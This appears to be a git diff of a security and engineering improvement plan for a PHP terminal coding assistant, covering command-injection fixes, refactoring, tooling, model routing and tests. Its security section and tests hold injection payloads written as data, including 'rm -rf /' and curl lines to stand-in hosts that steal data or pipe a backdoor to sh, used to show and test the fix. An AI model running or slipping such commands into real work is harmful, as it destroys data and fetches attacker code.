@@ -1,6 +1,6 @@
 # Swarm AI Assistant - Comprehensive Improvement Plan V4
 
-*Generated from analysis by Code Reviewer, DX Optimizer, and AI Engineer agents*
+_Generated from analysis by Code Reviewer, DX Optimizer, and AI Engineer agents_
 
 ## Executive Summary
 
@@ -16,6 +16,7 @@ This document outlines critical improvements needed for the Swarm AI coding assi
 **Severity**: CRITICAL - Remote Code Execution Risk
 
 **Vulnerable Code**:
+
 ```php
 // Lines 1162-1163: Direct exec() without sanitization
 $this->terminalHeight = (int) exec('tput lines') ?: 24;
@@ -32,6 +33,7 @@ system("stty {$this->originalTermState}");
 **Additional Vulnerable Location**: `src/CLI/Terminal/Ansi.php:201`
 
 **Exploitation Vector**:
+
 ```bash
 # Environment variable injection
 COLUMNS='80; rm -rf /' ./swarm-cli
@@ -39,13 +41,14 @@ LINES='24 && curl malicious-site.com/steal-data' ./swarm-cli
 ```
 
 **Fix Implementation**:
+
 ```php
 // Safe terminal size detection using PHP built-ins
 protected function getTerminalSizeSafe(): array {
     // First try environment variables (already integers)
     $width = filter_var(getenv('COLUMNS'), FILTER_VALIDATE_INT) ?: null;
     $height = filter_var(getenv('LINES'), FILTER_VALIDATE_INT) ?: null;
-    
+
     // Fallback to PHP stream detection
     if (!$width || !$height) {
         $stream = fopen('php://stdout', 'r');
@@ -55,7 +58,7 @@ protected function getTerminalSizeSafe(): array {
         }
         fclose($stream);
     }
-    
+
     return [
         $width ?: 80,
         $height ?: 24
@@ -69,18 +72,20 @@ protected function getTerminalSizeSafe(): array {
 **Severity**: HIGH - Denial of Service Risk
 
 **Current Issue**: No timeout mechanism, no automatic cleanup
+
 - Method `startProcess()` launches processes without timeouts
 - No zombie process prevention
 - Manual cleanup only via `cleanupCompletedProcesses()`
 
 **Enhanced Fix with Signal Handling**:
+
 ```php
 public function startProcess(string $input): string {
     $processId = uniqid('proc_');
     $processor = new ProcessSpawner($this->app, $this->log());
-    
+
     $processor->launch($input);
-    
+
     $this->activeProcesses[$processId] = [
         'processor' => $processor,
         'startTime' => microtime(true),
@@ -90,11 +95,11 @@ public function startProcess(string $input): string {
         'updates' => [],
         'pid' => $processor->getPid(), // Track process ID
     ];
-    
+
     // Register cleanup handler with signal support
     pcntl_signal(SIGCHLD, [$this, 'handleChildSignal']);
     register_tick_function([$this, 'cleanupTimedOutProcesses']);
-    
+
     return $processId;
 }
 
@@ -128,6 +133,7 @@ public function cleanupTimedOutProcesses(): void {
 **Severity**: MEDIUM
 
 **Issue**: Accepts any printable ASCII without validation
+
 ```php
 } elseif (mb_strlen($key) === 1 && ord($key) >= 32 && ord($key) <= 126) {
     $this->input .= $key;
@@ -136,6 +142,7 @@ public function cleanupTimedOutProcesses(): void {
 ```
 
 **Fix**: Add control character filtering
+
 ```php
 } elseif (mb_strlen($key) === 1 && ord($key) >= 32 && ord($key) <= 126) {
     // Filter control characters and escape sequences
@@ -156,11 +163,13 @@ public function cleanupTimedOutProcesses(): void {
 **Issue**: `FullTerminalUI.php` has 1,384 lines with methods exceeding 100 lines
 
 **Most Complex Methods**:
+
 - `readKey()` (lines 1177-1269): 93 lines, complex input parsing
-- `renderSidebar()` (lines 831-940): 110 lines, nested rendering logic  
+- `renderSidebar()` (lines 831-940): 110 lines, nested rendering logic
 - `renderHistoryEntry()` (lines 942-1016): 75 lines, multiple render paths
 
 **Solution - Component Extraction**:
+
 ```php
 // New structure splitting FullTerminalUI into focused components
 src/CLI/Terminal/
@@ -180,6 +189,7 @@ src/CLI/Terminal/
 ```
 
 **Implementation Example**:
+
 ```php
 // Extract complex readKey() into dedicated parser
 class EscapeSequenceParser {
@@ -191,17 +201,17 @@ class EscapeSequenceParser {
         "\033[H" => 'HOME',
         "\033[F" => 'END',
     ];
-    
+
     public function parse(string $input): ?KeyEvent {
         if (isset(self::ESCAPE_SEQUENCES[$input])) {
             return new KeyEvent(self::ESCAPE_SEQUENCES[$input]);
         }
-        
+
         // Handle alt combinations
         if (str_starts_with($input, "\033") && strlen($input) === 2) {
             return new KeyEvent('ALT+' . $input[1]);
         }
-        
+
         return null;
     }
 }
@@ -210,11 +220,13 @@ class EscapeSequenceParser {
 ### 2.2 Missing Tool Execution Abstractions
 
 **Current Issue**: Direct tool execution in `src/Core/ToolExecutor.php:154-219`
+
 - No parallel execution capability
 - No retry mechanisms
 - No circuit breaker patterns
 
 **Strategy Pattern Implementation**:
+
 ```php
 interface ToolExecutionStrategy {
     public function canExecute(array $tools): bool;
@@ -224,25 +236,25 @@ interface ToolExecutionStrategy {
 
 class ParallelExecutionStrategy implements ToolExecutionStrategy {
     private ExecutorService $executor;
-    
+
     public function __construct(int $maxThreads = 4) {
         $this->executor = new ExecutorService($maxThreads);
     }
-    
+
     public function execute(array $tools): array {
         $promises = array_map(
             fn($tool) => $this->executor->submit(fn() => $tool->execute()),
             $tools
         );
-        
+
         return Promise::all($promises)
             ->timeout(30) // 30 second timeout
             ->wait();
     }
-    
+
     public function canExecute(array $tools): bool {
         // Check if all tools support parallel execution
-        return array_reduce($tools, 
+        return array_reduce($tools,
             fn($carry, $tool) => $carry && $tool->isThreadSafe(),
             true
         );
@@ -251,7 +263,7 @@ class ParallelExecutionStrategy implements ToolExecutionStrategy {
 
 class SequentialExecutionStrategy implements ToolExecutionStrategy {
     private CircuitBreaker $circuitBreaker;
-    
+
     public function execute(array $tools): array {
         $results = [];
         foreach ($tools as $tool) {
@@ -260,7 +272,7 @@ class SequentialExecutionStrategy implements ToolExecutionStrategy {
                     "Tool {$tool->getName()} circuit breaker is open"
                 );
             }
-            
+
             try {
                 $results[] = $tool->execute();
                 $this->circuitBreaker->recordSuccess($tool->getName());
@@ -276,37 +288,39 @@ class SequentialExecutionStrategy implements ToolExecutionStrategy {
 
 ### 2.3 Unified Error Handling
 
-**Current Issues**: 
+**Current Issues**:
+
 - Generic `Exception` in `ProcessManager.php:181`, `ProcessSpawner.php:76`
 - `RuntimeException` in `CodingAgent.php:379,745`
 - Inconsistent catch blocks throughout
 
 **Error Boundary Implementation**:
+
 ```php
 class ErrorBoundary {
     private CircuitBreaker $circuitBreaker;
     private Logger $logger;
     private MetricsCollector $metrics;
-    
+
     public function wrap(callable $operation, string $context): mixed {
         $startTime = microtime(true);
-        
+
         try {
             if (!$this->circuitBreaker->canExecute($context)) {
                 throw new ServiceUnavailableException("Service $context is down");
             }
-            
+
             $result = $operation();
-            
+
             $this->circuitBreaker->recordSuccess($context);
             $this->metrics->record('operation.success', 1, ['context' => $context]);
-            $this->metrics->record('operation.duration', 
-                microtime(true) - $startTime, 
+            $this->metrics->record('operation.duration',
+                microtime(true) - $startTime,
                 ['context' => $context]
             );
-            
+
             return $result;
-            
+
         } catch (RateLimitException $e) {
             $this->logger->warning("Rate limit hit", [
                 'context' => $context,
@@ -315,7 +329,7 @@ class ErrorBoundary {
             $this->circuitBreaker->recordFailure($context);
             $this->metrics->record('operation.rate_limited', 1, ['context' => $context]);
             throw new RetryableException($e->getMessage(), $e->getRetryAfter());
-            
+
         } catch (NetworkException $e) {
             $this->logger->error("Network error", [
                 'context' => $context,
@@ -324,7 +338,7 @@ class ErrorBoundary {
             $this->circuitBreaker->recordFailure($context);
             $this->metrics->record('operation.network_error', 1, ['context' => $context]);
             throw new RetryableException($e->getMessage(), 5); // Retry after 5 seconds
-            
+
         } catch (Exception $e) {
             $this->logger->error("Operation failed", [
                 'context' => $context,
@@ -349,6 +363,7 @@ class ErrorBoundary {
 ### 3.1 One-Command Setup
 
 **Create**: `Makefile`
+
 ```makefile
 .PHONY: setup dev test lint clean docker help
 
@@ -397,6 +412,7 @@ help: ## Show this help
 ### 3.2 Git Hooks with Parallel Checks
 
 **Create**: `.githooks/pre-commit`
+
 ```bash
 #!/bin/bash
 set -e
@@ -428,6 +444,7 @@ echo "✅ All pre-commit checks passed!"
 ### 3.3 Enhanced IDE Configuration
 
 **Create**: `.vscode/settings.json`
+
 ```json
 {
   "php.version": "8.3",
@@ -459,6 +476,7 @@ echo "✅ All pre-commit checks passed!"
 ```
 
 **Create**: `.vscode/launch.json` for debugging
+
 ```json
 {
   "version": "0.2.0",
@@ -495,8 +513,9 @@ echo "✅ All pre-commit checks passed!"
 ### 3.4 Docker Development Environment
 
 **Create**: `docker-compose.yml`
+
 ```yaml
-version: '3.8'
+version: "3.8"
 
 services:
   app:
@@ -519,6 +538,7 @@ volumes:
 ```
 
 **Create**: `Dockerfile.dev`
+
 ```dockerfile
 FROM php:8.3-cli
 
@@ -544,6 +564,7 @@ CMD ["tail", "-f", "/dev/null"]
 **Current Issue**: No few-shot examples in `src/Prompts/PromptTemplates.php:44-52`
 
 **Add Few-Shot Examples**:
+
 ```php
 public static function classificationSystemWithExamples(): string {
     return "You are an AI coding assistant that classifies user requests.
@@ -573,6 +594,7 @@ Now classify the following request:";
 **Current Issue**: Fixed temperature (0.3) in `src/Agent/CodingAgent.php:30-31,319,473`
 
 **Implementation**:
+
 ```php
 protected function getTemperatureForTask(string $taskType, int $retryCount = 0): float {
     $baseTemp = match($taskType) {
@@ -583,10 +605,10 @@ protected function getTemperatureForTask(string $taskType, int $retryCount = 0):
         'debug', 'error_recovery' => 0.4,       // Slightly varied for problem solving
         default => 0.5
     };
-    
+
     // Increase temperature slightly on retries to get different results
     $retryAdjustment = min($retryCount * 0.1, 0.3);
-    
+
     return min($baseTemp + $retryAdjustment, 1.0);
 }
 ```
@@ -596,18 +618,19 @@ protected function getTemperatureForTask(string $taskType, int $retryCount = 0):
 **Current Issue**: Simple sliding window in `src/Agent/CodingAgent.php:1075-1124`
 
 **Intelligent Context Pruning**:
+
 ```php
 protected function optimizeContext(array $history): array {
     $scored = [];
     $now = time();
-    
+
     foreach ($history as $index => $message) {
         $score = 0;
-        
+
         // Recency score (exponential decay)
         $age = $now - ($message['timestamp'] ?? $now);
         $score += exp(-$age / 3600) * 10; // Decay over hours
-        
+
         // Role importance
         $score += match($message['role']) {
             'system' => 20,
@@ -615,30 +638,30 @@ protected function optimizeContext(array $history): array {
             'assistant' => 5,
             default => 1
         };
-        
+
         // Content importance indicators
         if (str_contains($message['content'], 'error')) $score += 15;
         if (str_contains($message['content'], 'file:')) $score += 10;
         if (str_contains($message['content'], 'function')) $score += 8;
         if (preg_match('/\.(php|js|py|java)/', $message['content'])) $score += 7;
-        
+
         // Short messages are often important commands
         if (strlen($message['content']) < 200) $score += 5;
-        
+
         // Tool responses are valuable
         if (isset($message['tool_call_id'])) $score += 12;
-        
+
         $scored[] = ['message' => $message, 'score' => $score];
     }
-    
+
     // Sort by score descending
     usort($scored, fn($a, $b) => $b['score'] <=> $a['score']);
-    
+
     // Take top messages within token budget
     $contextSize = 0;
     $optimized = [];
     $maxTokens = 3000; // Reserve for context
-    
+
     foreach ($scored as $item) {
         $tokens = $this->estimateTokens($item['message']['content']);
         if ($contextSize + $tokens < $maxTokens) {
@@ -646,12 +669,12 @@ protected function optimizeContext(array $history): array {
             $contextSize += $tokens;
         }
     }
-    
+
     // Restore chronological order
-    usort($optimized, fn($a, $b) => 
+    usort($optimized, fn($a, $b) =>
         ($a['timestamp'] ?? 0) <=> ($b['timestamp'] ?? 0)
     );
-    
+
     return $optimized;
 }
 ```
@@ -659,6 +682,7 @@ protected function optimizeContext(array $history): array {
 ### 4.4 Multi-Model Router
 
 **New Component**: `src/AI/ModelRouter.php`
+
 ```php
 class ModelRouter {
     private array $models = [
@@ -668,7 +692,7 @@ class ModelRouter {
         'opus' => 'claude-3-opus',       // Best for code generation
         'gemini' => 'gemini-1.5-pro'     // Long context (1M tokens)
     ];
-    
+
     private array $costs = [ // Per 1K tokens
         'gpt-4o-mini' => ['input' => 0.00015, 'output' => 0.0006],
         'gpt-4o' => ['input' => 0.005, 'output' => 0.015],
@@ -676,10 +700,10 @@ class ModelRouter {
         'claude-3-opus' => ['input' => 0.015, 'output' => 0.075],
         'gemini-1.5-pro' => ['input' => 0.00125, 'output' => 0.005]
     ];
-    
+
     public function selectModel(
-        string $taskType, 
-        int $complexity, 
+        string $taskType,
+        int $complexity,
         int $contextLength,
         ?float $maxCost = null
     ): string {
@@ -687,12 +711,12 @@ class ModelRouter {
         if ($contextLength > 100000) {
             return $this->models['gemini'];
         }
-        
-        // Long context tasks  
+
+        // Long context tasks
         if ($contextLength > 50000) {
             return $this->models['turbo'];
         }
-        
+
         // Code generation/analysis preference
         if (in_array($taskType, ['implementation', 'refactor', 'debug', 'review'])) {
             // Complexity-based selection for code tasks
@@ -704,17 +728,17 @@ class ModelRouter {
             }
             return $this->models['standard'];
         }
-        
+
         // Simple classification/extraction
         if (in_array($taskType, ['classification', 'extraction'])) {
             return $this->models['nano'];
         }
-        
+
         // Cost-conscious selection
         if ($maxCost !== null) {
             return $this->selectByCost($taskType, $contextLength, $maxCost);
         }
-        
+
         // Default based on complexity
         return match(true) {
             $complexity <= 3 => $this->models['nano'],
@@ -722,16 +746,16 @@ class ModelRouter {
             default => $this->models['turbo']
         };
     }
-    
+
     public function estimateCost(string $model, int $inputTokens, int $outputTokens): float {
         $modelKey = array_search($model, $this->models);
         if (!$modelKey || !isset($this->costs[$model])) {
             throw new InvalidArgumentException("Unknown model: $model");
         }
-        
+
         $inputCost = ($inputTokens / 1000) * $this->costs[$model]['input'];
         $outputCost = ($outputTokens / 1000) * $this->costs[$model]['output'];
-        
+
         return round($inputCost + $outputCost, 4);
     }
 }
@@ -744,34 +768,34 @@ class ResponseCache {
     private Redis $redis;
     private int $ttl = 300; // 5 minutes default
     private MetricsCollector $metrics;
-    
+
     public function get(string $prompt, string $model, array $params = []): ?array {
         $key = $this->generateKey($prompt, $model, $params);
-        
+
         $cached = $this->redis->get($key);
         if ($cached) {
             $this->metrics->record('cache.hit', 1, ['model' => $model]);
             $this->logger->debug('Cache hit', ['key' => $key]);
             return json_decode($cached, true);
         }
-        
+
         $this->metrics->record('cache.miss', 1, ['model' => $model]);
         return null;
     }
-    
+
     public function set(string $prompt, string $model, array $response, array $params = []): void {
         $key = $this->generateKey($prompt, $model, $params);
-        
+
         // Don't cache errors or low-confidence responses
-        if (isset($response['error']) || 
+        if (isset($response['error']) ||
             (isset($response['confidence']) && $response['confidence'] < 0.7)) {
             return;
         }
-        
+
         $this->redis->setex($key, $this->ttl, json_encode($response));
         $this->metrics->record('cache.set', 1, ['model' => $model]);
     }
-    
+
     private function generateKey(string $prompt, string $model, array $params): string {
         // Include temperature and other params in cache key
         $keyData = [
@@ -780,10 +804,10 @@ class ResponseCache {
             'temperature' => $params['temperature'] ?? 0.5,
             'max_tokens' => $params['max_tokens'] ?? null
         ];
-        
+
         return 'swarm:cache:' . md5(json_encode($keyData));
     }
-    
+
     public function invalidate(string $pattern = '*'): int {
         $keys = $this->redis->keys("swarm:cache:$pattern");
         return $this->redis->del($keys);
@@ -799,7 +823,7 @@ class TokenBudgetManager {
     private int $hourlyLimit;
     private array $usage = [];
     private string $storageFile;
-    
+
     public function __construct(
         int $dailyLimit = 100000,
         int $hourlyLimit = 10000
@@ -809,13 +833,13 @@ class TokenBudgetManager {
         $this->storageFile = 'storage/token_usage.json';
         $this->loadUsage();
     }
-    
+
     public function canAfford(int $estimatedTokens, string $model): bool {
         $this->resetIfNeeded();
-        
+
         $hourlyUsed = $this->getHourlyUsage();
         $dailyUsed = $this->getDailyUsage();
-        
+
         // Check both limits
         if ($hourlyUsed + $estimatedTokens > $this->hourlyLimit) {
             $this->logger->warning('Approaching hourly token limit', [
@@ -825,7 +849,7 @@ class TokenBudgetManager {
             ]);
             return false;
         }
-        
+
         if ($dailyUsed + $estimatedTokens > $this->dailyLimit) {
             $this->logger->warning('Approaching daily token limit', [
                 'used' => $dailyUsed,
@@ -834,10 +858,10 @@ class TokenBudgetManager {
             ]);
             return false;
         }
-        
+
         return true;
     }
-    
+
     public function track(int $tokens, float $cost, string $model): void {
         $entry = [
             'timestamp' => time(),
@@ -845,13 +869,13 @@ class TokenBudgetManager {
             'cost' => $cost,
             'model' => $model
         ];
-        
+
         $this->usage[] = $entry;
         $this->saveUsage();
-        
+
         $dailyUsed = $this->getDailyUsage();
         $dailyCost = $this->getDailyCost();
-        
+
         $this->logger->info('Token usage tracked', [
             'tokens' => $tokens,
             'cost' => $cost,
@@ -861,7 +885,7 @@ class TokenBudgetManager {
             'daily_percentage' => round(($dailyUsed / $this->dailyLimit) * 100, 2),
             'daily_cost' => $dailyCost
         ]);
-        
+
         // Alert at 80% usage
         if ($dailyUsed > $this->dailyLimit * 0.8) {
             $this->sendAlert('Approaching daily token limit', [
@@ -870,15 +894,15 @@ class TokenBudgetManager {
             ]);
         }
     }
-    
+
     private function getHourlyUsage(): int {
         $hourAgo = time() - 3600;
-        return array_reduce($this->usage, 
+        return array_reduce($this->usage,
             fn($sum, $entry) => $entry['timestamp'] > $hourAgo ? $sum + $entry['tokens'] : $sum,
             0
         );
     }
-    
+
     private function getDailyUsage(): int {
         $dayAgo = time() - 86400;
         return array_reduce($this->usage,
@@ -900,35 +924,35 @@ class TerminalDebugMode {
     private bool $enabled;
     private array $metrics = [];
     private float $lastRenderTime = 0;
-    
+
     public function __construct() {
         $this->enabled = getenv('SWARM_UI_DEBUG') === 'true';
-        
+
         if ($this->enabled) {
             $this->initDebugLog();
         }
     }
-    
+
     public function startRender(): void {
         if (!$this->enabled) return;
         $this->renderStartTime = microtime(true);
     }
-    
+
     public function endRender(): void {
         if (!$this->enabled) return;
-        
+
         $this->lastRenderTime = (microtime(true) - $this->renderStartTime) * 1000;
         $this->metrics['renders'][] = $this->lastRenderTime;
-        
+
         // Keep only last 100 renders for FPS calculation
         if (count($this->metrics['renders']) > 100) {
             array_shift($this->metrics['renders']);
         }
     }
-    
+
     public function renderDebugPanel(): string {
         if (!$this->enabled) return '';
-        
+
         $stats = [
             'FPS' => $this->calculateFPS(),
             'Render' => sprintf('%.2fms', $this->lastRenderTime),
@@ -937,20 +961,20 @@ class TerminalDebugMode {
             'Handlers' => count($this->getEventHandlers()),
             'Processes' => $this->getActiveProcessCount()
         ];
-        
+
         // Render as overlay in top-right corner
         $panel = "┌─ Debug ─────────────┐\n";
         foreach ($stats as $label => $value) {
             $panel .= sprintf("│ %-8s: %10s │\n", $label, $value);
         }
         $panel .= "└─────────────────────┘";
-        
+
         return $this->positionOverlay($panel, 'top-right');
     }
-    
+
     private function calculateFPS(): float {
         if (empty($this->metrics['renders'])) return 0;
-        
+
         $avgRenderTime = array_sum($this->metrics['renders']) / count($this->metrics['renders']);
         return $avgRenderTime > 0 ? round(1000 / $avgRenderTime, 1) : 0;
     }
@@ -968,10 +992,10 @@ class ResponsiveLayout {
         'lg' => 160,  // Large terminal
         'xl' => 200   // Extra large
     ];
-    
+
     public function getLayout(int $width, int $height): array {
         $size = $this->getSize($width);
-        
+
         return match($size) {
             'xs' => $this->getMinimalLayout($width, $height),
             'sm' => $this->getCompactLayout($width, $height),
@@ -980,7 +1004,7 @@ class ResponsiveLayout {
             default => $this->getStandardLayout($width, $height)
         };
     }
-    
+
     private function getMinimalLayout(int $width, int $height): array {
         // Single column, no sidebar
         return [
@@ -991,10 +1015,10 @@ class ResponsiveLayout {
             'footer' => null
         ];
     }
-    
+
     private function getFullLayout(int $width, int $height): array {
         $sidebarWidth = (int)($width * 0.3); // 30% for sidebar
-        
+
         return [
             'header' => ['height' => 3, 'width' => $width],
             'sidebar' => [
@@ -1022,67 +1046,67 @@ class ResponsiveLayout {
 class TerminalCapabilities {
     private array $capabilities = [];
     private static ?self $instance = null;
-    
+
     public static function detect(): self {
         if (self::$instance === null) {
             self::$instance = new self();
         }
         return self::$instance;
     }
-    
+
     private function __construct() {
         $this->detectAll();
     }
-    
+
     private function detectAll(): void {
         // Color support detection
         $this->capabilities['colors'] = $this->detectColorSupport();
-        
+
         // Unicode support
         $this->capabilities['unicode'] = $this->detectUnicodeSupport();
-        
+
         // Terminal type
         $this->capabilities['type'] = getenv('TERM') ?: 'unknown';
-        
+
         // Terminal emulator detection
         $this->capabilities['emulator'] = $this->detectEmulator();
-        
+
         // Size
         $this->capabilities['size'] = $this->getTerminalSize();
-        
+
         // Mouse support
         $this->capabilities['mouse'] = $this->detectMouseSupport();
-        
+
         // Sixel graphics support
         $this->capabilities['sixel'] = $this->detectSixelSupport();
-        
+
         // Kitty graphics protocol
         $this->capabilities['kitty_graphics'] = $this->detectKittyGraphics();
     }
-    
+
     private function detectColorSupport(): int {
         $term = getenv('TERM') ?: '';
         $colorterm = getenv('COLORTERM') ?: '';
-        
+
         // True color (24-bit)
         if ($colorterm === 'truecolor' || $colorterm === '24bit') {
             return 16777216;
         }
-        
+
         // 256 colors
         if (str_contains($term, '256color')) {
             return 256;
         }
-        
+
         // 16 colors
         if (str_contains($term, 'color')) {
             return 16;
         }
-        
+
         // Monochrome
         return 0;
     }
-    
+
     private function detectEmulator(): string {
         // Check various environment variables
         $checks = [
@@ -1093,21 +1117,21 @@ class TerminalCapabilities {
             'WT_SESSION' => getenv('WT_SESSION') ? 'windows-terminal' : null,
             'VSCODE_TERM' => getenv('TERM_PROGRAM') === 'vscode' ? 'vscode' : null,
         ];
-        
+
         foreach ($checks as $check) {
             if ($check) return strtolower($check);
         }
-        
+
         return 'unknown';
     }
-    
+
     private function detectMouseSupport(): bool {
         $emulator = $this->capabilities['emulator'] ?? 'unknown';
         $supportedEmulators = ['iterm2', 'windows-terminal', 'gnome-terminal', 'konsole', 'xterm'];
-        
+
         return in_array($emulator, $supportedEmulators);
     }
-    
+
     public function canUse(string $feature): bool {
         return match($feature) {
             'colors' => ($this->capabilities['colors'] ?? 0) > 0,
@@ -1120,7 +1144,7 @@ class TerminalCapabilities {
             default => false
         };
     }
-    
+
     public function getBestAvailable(string ...$features): ?string {
         foreach ($features as $feature) {
             if ($this->canUse($feature)) {
@@ -1143,31 +1167,31 @@ class MetricsCollector {
     private array $metrics = [];
     private array $timers = [];
     private ExportInterface $exporter;
-    
+
     public function __construct(ExportInterface $exporter = null) {
         $this->exporter = $exporter ?? new PrometheusExporter();
     }
-    
+
     public function startTimer(string $name): void {
         $this->timers[$name] = microtime(true);
     }
-    
+
     public function endTimer(string $name, array $tags = []): float {
         if (!isset($this->timers[$name])) {
             throw new InvalidArgumentException("Timer '$name' not started");
         }
-        
+
         $duration = microtime(true) - $this->timers[$name];
         unset($this->timers[$name]);
-        
+
         $this->record("{$name}.duration", $duration, $tags);
         return $duration;
     }
-    
+
     public function increment(string $metric, array $tags = []): void {
         $this->record($metric, 1, $tags);
     }
-    
+
     public function record(string $metric, float $value, array $tags = []): void {
         $this->metrics[] = [
             'metric' => $metric,
@@ -1175,13 +1199,13 @@ class MetricsCollector {
             'tags' => $tags,
             'timestamp' => microtime(true)
         ];
-        
+
         // Auto-flush at threshold
         if (count($this->metrics) >= 100) {
             $this->flush();
         }
     }
-    
+
     public function gauge(string $metric, float $value, array $tags = []): void {
         // Gauges replace previous values
         $key = $this->getMetricKey($metric, $tags);
@@ -1193,10 +1217,10 @@ class MetricsCollector {
             'type' => 'gauge'
         ];
     }
-    
+
     public function flush(): void {
         if (empty($this->metrics)) return;
-        
+
         try {
             $this->exporter->export($this->metrics);
             $this->metrics = [];
@@ -1207,16 +1231,16 @@ class MetricsCollector {
             ]);
         }
     }
-    
+
     public function histogram(string $metric, float $value, array $buckets = null): void {
         $buckets = $buckets ?? [0.01, 0.025, 0.05, 0.1, 0.25, 0.5, 1, 2.5, 5, 10];
-        
+
         foreach ($buckets as $bucket) {
             if ($value <= $bucket) {
                 $this->increment("{$metric}.bucket", ['le' => (string)$bucket]);
             }
         }
-        
+
         $this->record("{$metric}.sum", $value);
         $this->increment("{$metric}.count");
     }
@@ -1230,10 +1254,10 @@ class APM {
     private MetricsCollector $metrics;
     private array $spans = [];
     private string $traceId;
-    
+
     public function startSpan(string $name, array $attributes = []): string {
         $spanId = uniqid('span_');
-        
+
         $this->spans[$spanId] = [
             'name' => $name,
             'start' => microtime(true),
@@ -1241,22 +1265,22 @@ class APM {
             'trace_id' => $this->traceId,
             'parent_id' => $this->getCurrentSpanId()
         ];
-        
+
         return $spanId;
     }
-    
+
     public function endSpan(string $spanId, array $attributes = []): void {
         if (!isset($this->spans[$spanId])) {
             return;
         }
-        
+
         $span = $this->spans[$spanId];
         $duration = microtime(true) - $span['start'];
-        
+
         $this->metrics->histogram('span.duration', $duration, [
             'span_name' => $span['name']
         ]);
-        
+
         // Export span data
         $this->exportSpan([
             'trace_id' => $span['trace_id'],
@@ -1267,13 +1291,13 @@ class APM {
             'duration' => $duration,
             'attributes' => array_merge($span['attributes'], $attributes)
         ]);
-        
+
         unset($this->spans[$spanId]);
     }
-    
+
     public function trace(string $name, callable $operation, array $attributes = []): mixed {
         $spanId = $this->startSpan($name, $attributes);
-        
+
         try {
             $result = $operation();
             $this->endSpan($spanId, ['status' => 'success']);
@@ -1302,27 +1326,27 @@ describe('Command Injection Prevention', function () {
     test('terminal size detection is safe from injection', function () {
         $_ENV['COLUMNS'] = '80; rm -rf /';
         $_ENV['LINES'] = '24 && echo hacked';
-        
+
         $ui = new FullTerminalUI();
         $size = $ui->getTerminalSize();
-        
+
         expect($size)->toBe([80, 24]);
         expect(file_exists('/etc/passwd'))->toBeTrue(); // System intact
     });
-    
+
     test('terminal state restoration prevents injection', function () {
         $ui = new FullTerminalUI();
         $maliciousState = 'sane; curl evil.com/backdoor | sh';
-        
+
         // Attempt to inject via state
         $reflection = new ReflectionClass($ui);
         $property = $reflection->getProperty('originalTermState');
         $property->setAccessible(true);
         $property->setValue($ui, $maliciousState);
-        
+
         // Should sanitize on restore
         $ui->cleanup();
-        
+
         // Verify no execution occurred
         expect(shell_exec('ps aux | grep curl'))->not->toContain('evil.com');
     });
@@ -1336,34 +1360,34 @@ describe('Command Injection Prevention', function () {
 describe('Performance Benchmarks', function () {
     test('context optimization reduces tokens by 30%', function () {
         $agent = new CodingAgent();
-        
+
         // Generate large history
         $history = array_map(fn($i) => [
             'role' => $i % 3 === 0 ? 'user' : 'assistant',
             'content' => str_repeat("Message $i ", 100),
             'timestamp' => time() - (1000 - $i)
         ], range(1, 100));
-        
+
         $original = $agent->estimateTokens($history);
         $optimized = $agent->optimizeContext($history);
         $optimizedTokens = $agent->estimateTokens($optimized);
-        
+
         $reduction = ($original - $optimizedTokens) / $original * 100;
-        
+
         expect($reduction)->toBeGreaterThan(30);
         expect($optimized)->toHaveCount(lessThan(50));
     });
-    
+
     test('parallel tool execution improves speed', function () {
         $executor = new ToolExecutor();
         $executor->setStrategy(new ParallelExecutionStrategy());
-        
+
         $tools = array_map(fn($i) => new MockSlowTool($i), range(1, 5));
-        
+
         $start = microtime(true);
         $results = $executor->executeAll($tools);
         $duration = microtime(true) - $start;
-        
+
         // Should complete in ~1 second (parallel) not 5 seconds (sequential)
         expect($duration)->toBeLessThan(1.5);
         expect($results)->toHaveCount(5);
@@ -1378,28 +1402,28 @@ describe('Performance Benchmarks', function () {
 describe('AI Optimization Integration', function () {
     test('model router selects appropriate models', function () {
         $router = new ModelRouter();
-        
+
         // Simple classification
         $model = $router->selectModel('classification', 2, 500);
         expect($model)->toBe('gpt-4o-mini');
-        
+
         // Complex code generation
         $model = $router->selectModel('implementation', 9, 5000);
         expect($model)->toBe('claude-3-opus');
-        
+
         // Long context
         $model = $router->selectModel('analysis', 5, 150000);
         expect($model)->toBe('gemini-1.5-pro');
     });
-    
+
     test('response cache reduces API calls', function () {
         $cache = new ResponseCache();
         $agent = new CodingAgent(cache: $cache);
-        
+
         // First call - cache miss
         $response1 = $agent->classify('Create a new file');
         expect($cache->getHitRate())->toBe(0);
-        
+
         // Second identical call - cache hit
         $response2 = $agent->classify('Create a new file');
         expect($cache->getHitRate())->toBeGreaterThan(0);
@@ -1413,30 +1437,35 @@ describe('AI Optimization Integration', function () {
 ## 8. Implementation Priority
 
 ### Phase 1: Critical Security (Week 1)
+
 1. ✅ Fix command injection vulnerabilities
 2. ✅ Implement process timeout mechanisms
 3. ✅ Add input sanitization
 4. ✅ Security test suite
 
 ### Phase 2: Performance & Stability (Week 2)
+
 1. ⬜ Refactor FullTerminalUI into components
 2. ⬜ Implement error boundary pattern
 3. ⬜ Add metrics collection
 4. ⬜ Performance test suite
 
 ### Phase 3: AI Optimization (Week 3)
+
 1. ⬜ Enhanced prompts with few-shot examples
 2. ⬜ Context optimization algorithm
 3. ⬜ Model router implementation
 4. ⬜ Response caching layer
 
 ### Phase 4: Developer Experience (Week 4)
+
 1. ⬜ One-command setup (Makefile)
 2. ⬜ Docker development environment
 3. ⬜ IDE configurations
 4. ⬜ Git hooks and automation
 
 ### Phase 5: Advanced Features (Week 5+)
+
 1. ⬜ Parallel tool execution
 2. ⬜ Token budget management
 3. ⬜ Advanced terminal capabilities
@@ -1447,21 +1476,25 @@ describe('AI Optimization Integration', function () {
 ## Success Metrics
 
 ### Security
+
 - Zero command injection vulnerabilities
 - All processes timeout within limits
 - Input validation on all user inputs
 
 ### Performance
+
 - 30% reduction in token usage
 - 40% reduction in API costs
 - Sub-second UI response times
 
 ### Developer Experience
+
 - Setup time < 2 minutes
 - Pre-commit checks < 30 seconds
 - Test coverage > 80%
 
 ### Code Quality
+
 - Cyclomatic complexity < 10 per method
 - No methods > 50 lines
 - Consistent error handling patterns
@@ -1473,6 +1506,7 @@ describe('AI Optimization Integration', function () {
 This comprehensive improvement plan addresses critical security vulnerabilities while enhancing performance, developer experience, and AI capabilities. The phased approach ensures immediate security fixes while building toward a more robust and efficient system.
 
 **Immediate Actions Required**:
+
 1. Fix command injection vulnerabilities (CRITICAL)
 2. Implement process timeouts (HIGH)
 3. Begin refactoring FullTerminalUI (MEDIUM)
